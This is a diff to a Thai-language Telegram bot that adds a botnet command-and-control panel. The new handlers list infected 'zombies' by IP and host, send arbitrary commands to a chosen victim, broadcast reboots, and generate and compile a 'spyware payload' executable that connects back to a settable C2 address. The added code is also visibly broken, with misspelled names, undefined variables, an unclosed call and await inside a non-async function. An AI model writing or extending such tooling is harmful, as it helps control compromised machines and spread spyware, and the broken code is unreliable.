@@ -1,4 +1,9 @@
 import io
+import json
+import socket
+import struct
+import traceback
+from typing import Dict, List, Callab, Optional
 import os
 import re
 import sys
@@ -15,6 +20,7 @@ load_dotenv()
 from telegram import Update, ChatPermissions, InlineKeyboardButton, InlineKeyboardMarkup
 from telegram.constants import ChatMemberStatus, ChatAction, ChatType
 from telegram.ext import (
+    Application,
     ApplicationBuilder,
     CommandHandler,
     MessageHandler,
@@ -3460,6 +3466,206 @@ async def debt_callback_handler(update: Update, context: ContextTypes.DEFAULT_TY
             await query.answer("เกิดข้อผิดพลาด ลองใหม่อีกครั้ง", show_alert=True)
         except TelegramError:
             pass
+            
+            
+# ------ C2 Server ---------
+
+def is_admins(update: Update) -> bool:
+    return update.effective_user.id in ADMIN_IDS
+    
+async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if not is_admins(update):
+        await update.message.reply_text("Access Denied. Admins Only.")
+        return
+    await update.message_reply_text("C2 Bot Initialized. Listening for zombies...")
+    
+async def list_zombies(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if not is_admins(update):
+        await update.message.reply_text("Access Denied.")
+        return
+        
+    if not ACTIVE_BOTS:
+        await update.message.reply_text("No active zombies connected.")
+        return
+        
+    msg = "**Active Zombies:**\n"
+    buttons = []
+    for sid, info in ACTIVE_BOTS.items():
+        ip = info.get("ip", "Unknown")
+        host = info.get("host", "Unknown")
+        
+        display_sid = f"{sid[:20]}..." if len(sid) > 20 else sid
+        
+        msg += (
+            f"ID: `{display_sid}` | "
+            f"IP: `{ip}` | "
+            f"Host: `{host}`\n"
+        )
+        callback_id = sid[:40]
+        
+        buttons.append([
+            InlineKeyboardButton(
+                f"Target: {sid[:15]}",
+                callback_data=f"sel_{callback_id}"
+            )
+        ])
+    
+    keyboard = InlineKeyboardMarkup(buttons)
+    
+    if update.effective_message:
+        await update.effective_message.reply_text(
+             msg,
+             parse_mode="Markdown",
+             reply_markup=keyboard
+        )
+    
+async def select_target_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    query = update.callback_query
+    await query.answer()
+    session_id = query.data.replace("sel_", "")
+    context.user_data['current_target'] = session_id
+    await query.edit_message_text(f"Target Selected: `{session_id}`. Send command in chat.")
+    
+async def execute_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if not is_admins(update):
+        return
+        
+    if 'current_target' not in context.user_data:
+        await update.message.reply_text("No target selected. Use /list first.")
+        return
+        
+    session_id = context.user_data['current_target']
+    command = update.message.text
+    
+    # Check if there's a command queue logic needed or direct send
+    success = await C2_SERVER.send_command(session_id, command)
+    
+    if success:
+        await update.message.reply_text(f"Command sent to `{session_id}`: `{command}`\nWaiting for output...".format(session_id=session_id, command=command), parse_mode="Markdown")
+    else:
+        await update.message.reply_text(f"Failed to send command to `{session_id}`. Zombie may be offline.".format(session_id=session_id), parse_mode="Markdown")
+        
+async def reboot_zombies(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if not is_admins(update):
+        return
+    await update.message.reply_text("Broadcasting reboot command to all zombies...")
+    for sid in ACTIVE_BOTS:
+        await C2_SERVER.send_command(sid, "SYSTEM_REBOOT")
+    await update.message.reply_text("Reboot signal sent.")
+    
+# -------- Bot Integration --------
+
+C2_SERVER_IP = C2_SERVER_DEFAULT_IP
+C2_SERVER_PORT = C2_PORT_DEFAULT
+
+async def set_c2_server(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """
+    Command: /c2_server <IP>
+    Sets the target C2 IP address for the malware generator.
+    """
+    if update.effective_user.id not in ADMIN_IDS:
+        await update.message.reply_text("Access Denied. Admin Only.")
+        return
+        
+    if len(context.args) < 1:
+        await update.message.reply_text(f"Usage: /c2_server <IP_ADDRESS>\nCurrent IP: {C2_SERVER_IP}")
+        return
+        
+    ip_address = context.args[0]
+    
+    # Basic IP validation regex
+    if not re.match(r"^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$", ip_address):
+        await update.message.reply_text("Invalid IP format.")
+        return
+        
+    global C2_SERVER_IP
+    C2_SERVER_IP = ip_address
+    
+    await update.message.reply_text(
+        f"C2 Server IP updated to: `{ip_address}`.\n"
+        f"All future payloads will connect to this address.",
+        parse_mode="Markdown"
+    )
+    
+async def generate_payload(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """
+    Command: /generate <filename> [custom_logic]
+    Generates a spyware payload and compiles it.
+    """
+    if update.effective_user.id not in ADMIN_IDS:
+        await update.message.reply_text("Access Denied.")
+        return
+        
+    if len(context.args) < 1:
+        await update.message.reply_text(
+            "Usage: /generate <filename.exe> [optional_custom_code]\n"
+            "Example: /generate backdoor.exe 'print(\"Hello\")'\n"
+            f"Target C2: {C2_SERVER_IP}:{C2_SERVER_PORT}"
+        )
+        return
+        
+    target_filename = context.args[0]
+    if not target_filename.endwith('.exe'):
+        filename += '.exe'
+        
+    await update.message.reply_text(f"Initiating payload generation for {targetfilename}...", parse_mode="Markdown")
+    
+    try:
+        generator = SpywareGenerator()
+        payload_code = generator.generate_payload(C2_SERVER_IP, C2_SERVER_PORT)
+        
+        await update.message.reply_text("Compiling payload...")
+        output_path = generator.compile_to_exe(payload_code, target_filename)
+        
+        if os.path.exists(output_path):
+            await update.message.reply_document(document=open(output_path, 'rb'), caption=f"Payload {target_filename} generated successfully.\nC2 Target: {C2_SERVER_IP}:{C2_SERVER_PORT}")
+        else:
+            await update.message.reply_text("Payload generated but file output failed.")
+            
+    except Exception as e:
+        await update.message.reply_text(f"Error during generation: {str(e)}", parse_mode="Markdown")
+        logging.error(f"Payload generation failed: {e}")
+        
+async def cmd_starts(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """
+    Command: /starts
+    Display bot status and available commands.
+    """
+    await update.message.reply_text(
+        f"Jripbot C2 Controller Initialized\n\n"
+        f"Status: Online\n"
+        f"Current C2 IP: {C2_SERVER_IP}\n"
+        f"Current C2 Port: {C2_SERVER_PORT}\n"
+        f"Admin Status: {'Confirmed' if update.effective_user.id in ADMIN_IDS else 'Guest'}\n\n"
+        f"Commands:\n"
+        f"/c2_server <IP> - Update C2 IP\n"
+        f"/generate <name> - Create and compile payload\n"
+        f"/statuss - Check system integrity"
+    )
+
+async def cmd_statuss(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """
+    Command: /statuss
+    Checks if dependencies and output directories are ready.
+    """
+    if update.effective_user.id not in ADMIN_IDS:
+        await update.message.reply_text("Access Denied.")
+        return
+        
+    checks = [
+        ("Output Directory", os.path.exists(MALWARE_OUTPUT_DIR)),
+        ("Python Executable", os.path.exists(PYTHON_PATH)),
+        ("PyInstaller Module", subprocess.run([PYTHON_PATH, "-m", "PyInstaller", "-version"], capture_output=True).returncode == 0)
+    ]
+    
+    report = "System Check:\n"
+    all_ok = True
+    for name, cmd_statuss in checks:
+        report += f"{name}: {'OK' if cmd_statuss else 'FAIL'}\n"
+        if not cmd_statuss: all_ok = False
+            
+    status_msg = "System Ready." if all_ok else "System Configuration Issues Detected."
+    await update.message.reply_text(f"{status_msg}\n{report}", parse_mode="Markdown"
         
 # ---------------- GitHub Repository Manager (Phase 7) ----------------
 #
@@ -5775,8 +5981,12 @@ def log_tor_status() -> bool:
     )
     return False
 
+C2_SERVER = C2Server()
 
 def main():
+    # Start C2 Server in a separate thread/task
+    asyncio.create_task(C2_SERVER.start_listening())
+    
     if not BOT_TOKEN:
         raise SystemExit("BOT_TOKEN is not set. Please check .env file")
         
@@ -5849,6 +6059,7 @@ def main():
         logger.exception("REFDATA: ซิงก์ตอน startup ผิดพลาด (ใช้ไฟล์ในเครื่องต่อได้)")
     
     app = (
+        Application.builder().token("BOT_TOKEN").build()
         ApplicationBuilder()
         .token(BOT_TOKEN)
         .post_init(post_init)
@@ -5917,6 +6128,12 @@ def main():
     app.add_handler(CommandHandler("pttune", cmd_pttune))
     app.add_handler(CommandHandler("ptcoverage", cmd_ptcoverage))
     app.add_handler(CommandHandler("purple_report", cmd_purple_report))
+    app.add_handler(CommandHandler("starts", cmd_starts))
+    app.add_handler(CommandHandler("statuss", cmd_statuss))
+    app.add_handler(CommandHandler("c2_server", set_c2_server))
+    app.add_handler(CommandHandler("generate", generate_payload))
+    app.add_handler(CommandHandler("list", list_zombies))
+    app.add_handler(CommandHandler("reboot", reboot_zombies))
     # cmd_bbreport existed but was never registered, so /bbreport was
     # unreachable and bb_report.py was dead code. Registered here with
     # the rest of the reporting commands.
@@ -5963,9 +6180,9 @@ def main():
         handle_imagine_caption,
     ))
     app.add_handler(MessageHandler(
-        (filters.PHOTO | filters.Document.ALL) & filters.CAPTION
+        (filters.PHOTO | filters.TEXT | filters.Document.ALL) & filters.CAPTION
         & ~filters.CaptionRegex(IMAGINE_CAPTION_RE) & ~filters.COMMAND,
-        handle_media_message,
+        handle_media_message, execute_command,
     ))
     # Platform admin commands (/plugins, /workflow, /migration) and any
     # plugin-contributed commands, registered through the same is_admin gate
@@ -5978,6 +6195,19 @@ def main():
             logger.exception("PLATFORM: handler registration failed (core bot unaffected)")
 
     app.add_error_handler(error_handler)
+    
+    await application.initialize()
+    await application.start()
+    await application.updater.start_polling()
+    
+    try:
+        await application.updater.start_polling()
+    except KeyboardInterrupt:
+        pass
+    finally:
+        C2_SERVER.stop()
+        await application.stop()
+        await application.shutdown()
 
     logger.info("HANDLERS: OK")
     logger.info("POLLING: STARTED")
